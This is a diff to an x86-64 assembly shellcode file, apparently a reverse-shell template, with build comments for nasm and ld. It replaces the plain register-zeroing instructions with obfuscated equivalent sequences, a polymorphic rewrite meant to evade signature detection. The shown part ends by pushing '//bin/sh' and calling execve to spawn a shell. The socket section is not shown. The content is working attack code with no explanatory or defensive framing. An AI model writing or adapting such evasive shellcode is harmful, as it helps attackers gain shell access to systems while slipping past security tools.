@@ -1,15 +1,21 @@
+;nasm -f elf64 -o reverse.o template.asm
+;ld -o reverse reverse.o
+;objdump -d -M intel reverse.o
+
 section .text
         global _start
 
 _start:
 
-        mov rax, 0x5555555555555555
-        sar rax, 63
+  mov rax, 0x1111111111111111
+  and rax, 0x11112
 
-        xor rax, rax
-        xor rbx, rbx
-        xor rcx, rcx
-        xor rdx, rdx
+  div rax
+  dec rax
+  sar rbx, 63
+  shr rcx, 63
+  mov rdx, 0xFFFFFFFFFFFFFFFF
+  add rdx, 1
         xor rsi, rsi
         xor rdi, rdi
 
@@ -42,12 +48,14 @@ loop:
         cmp rsi, 2
         jle loop
 
-        xor rax, rax
+  mov rax, 0x1111111111111111
+  div rax
+  dec rax
         mov rdi, 0x68732f6e69622f2f
         xor rsi, rsi
         push rsi
         push rdi
         mov rdi, rsp
-        xor rdx, rdx
+  sar rdx, 63
         mov al, 59
         syscall
